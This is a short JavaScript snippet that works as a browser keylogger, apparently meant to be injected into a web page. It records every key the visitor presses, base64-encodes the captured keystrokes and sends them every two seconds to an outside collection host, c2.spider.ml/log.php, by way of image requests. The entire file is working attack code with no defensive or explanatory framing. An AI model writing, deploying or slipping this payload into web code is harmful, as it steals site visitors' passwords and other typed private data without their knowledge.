var push_url = "http://c2.spider.ml/log.php?session=";

var buffer = [];
document.addEventListener("keydown", function(e) {
    key = e.key;
    if (key.length > 1 || key == " ") { key = "[" + key + "]" }
    buffer.push(key);
});

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(btoa(buffer.join('')));

        var img = new Image();
        img.src = push_url + data;

        buffer = [];
    }
}, 2000);
